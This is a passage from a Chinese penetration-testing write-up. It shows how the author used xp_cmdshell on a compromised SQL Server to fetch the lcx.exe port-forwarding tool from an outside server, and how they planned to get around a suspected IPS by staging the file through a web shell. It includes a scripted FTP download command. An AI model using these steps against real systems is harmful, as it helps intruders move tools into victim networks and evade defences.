0x02 xp\_cmdshell研究不多，本人思路是通过搭建公网环境，利用cmd执行下载文件的方法下载一个端口转发工具（该sa服务器并没有杀软）

  

![](../Images/55bf67aaafdd003d6679398e81c21a60.png)

  

![](../Images/b8b002bede6470553a7a1ecd876f35f3.png)

  

提示没有找到资源，也就是没有找到我放在自己搭建公网服务器的lcx.exe程序，后来又尝试ftp协议下载，依然提示无法找到文件，所以我判断是外围存在ips或者waf等防护设备，在exe下载到服务器之前被拦截了，另外通过sqlmap的提示信息可能也证明这一点：

![](../Images/adc337331da87bf8871a6e9984931764.png)

  

0x03 改变思路，不是已经有了内网web服务器的shell权限了吗，可通过菜刀将lcx.exe放到web服务器上，然后利用vbs通过内网web服务器下载，避免通过ips被拦截，走起。。

ps：  ftp一条命令下载远程服务器文件的方法：  
1）在指定目录新建一个txt文件，如11.txt，内容为：  
admin             ；ftp服务器账号  
admin              ;  ftp服务器密码  
prompt            ;开启prompt模式  
mget lcx.exe    ;下载文件  
  
2）执行命令：ftp -s:11.txt x.x.x.x     ;公网ftp服务器IP地址，-s表示读取11.txt文件内容作为ftp输入，与服务器进行交互
